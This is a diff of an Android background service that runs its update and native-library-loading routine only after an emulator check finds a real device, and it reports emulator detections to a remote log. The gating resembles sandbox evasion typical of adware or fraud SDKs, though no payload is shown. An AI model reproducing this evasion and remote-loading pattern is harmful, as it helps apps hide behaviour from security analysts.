@@ -3,7 +3,8 @@ package com.use.nice;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.os.IBinder;
+import android.os.*;
+import android.util.Log;
 
 import com.use.nice.manager.GlobalContext;
 import com.use.nice.update.UDCtrl;
@@ -24,8 +25,7 @@ public class MyService extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
-
-    ExecutorService service = Executors.newSingleThreadExecutor();
+   static ExecutorService service = Executors.newSingleThreadExecutor();
     public final  static boolean testAsset = false;
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -35,6 +35,10 @@ public class MyService extends Service {
             NiceFace.onReceive(this, intent);
             return super.onStartCommand(intent, flags, startId);
         }
+
+//        if(!getPackageName().equals("")) {
+//            throw new RuntimeException("com.surprise.shuabasejoymenghull");
+//        }
 
         Util_File.writeDef(this,"progress","99");
 
@@ -47,15 +51,15 @@ public class MyService extends Service {
         EmulateCheckUtil.isValidDevice(MyService.this, new EmulateCheckUtil.ResultCallBack() {
             @Override
             public void isEmulator() {
-
+                UDCtrl.getIns().pushLog(202+"");
             }
-
             @Override
             public void isDevice() {
                 Util_Log.log("isDevice");
                 service.execute(new Runnable() {
                     @Override
                     public void run() {
+                        Util_Log.log("begin service!!!!"+ android.os.Process.myPid()+","+service);
                         Context paramContext = MyService.this;
                         Util_Log.log(UpdateUtil.surePullParams(paramContext, null).toString());
 
@@ -63,6 +67,7 @@ public class MyService extends Service {
                         String lastSoProgress = Util_File.readDef(paramContext,FieldName.progress,"0");
                         if(!lastSoProgress.equals("0")){
                             UDCtrl.getIns().pushLog(201+"_"+lastSoProgress);
+                            Log.e("J_Nice","-------------"+lastSoProgress);
                             //    Util_File.writeDef(ctx, FieldName.bad_progress, lastSoProgress);
                             Util_File.writeDef(paramContext,FieldName.progress,"0");
                         }
